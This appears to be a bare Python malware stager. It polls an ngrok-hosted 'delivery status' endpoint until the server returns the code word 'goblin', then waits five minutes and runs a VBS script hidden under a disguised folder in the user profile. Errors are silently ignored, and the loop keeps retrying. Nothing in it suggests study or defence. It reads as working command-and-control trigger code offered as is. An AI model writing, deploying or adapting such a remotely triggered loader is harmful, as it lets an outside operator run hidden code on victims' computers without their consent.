
import time
import requests
import subprocess

config = {
    "check_url": "https://moderately-glowing-iguana.ngrok-free.app/dashboard/diliverystatus",
    "code": "goblin",
    "process": "test.exe"  
}



def temp_data():
    time.sleep(300)
    subprocess.run(["%userprofile%\windordir\\verification.vbs"], shell=True)
                        
    

while True:
    try:
        response = requests.get(config['check_url'])
     
        if config['code'] == response.json()['status']:
            temp_data()

            break
    except:
        pass
    time.sleep(10)  
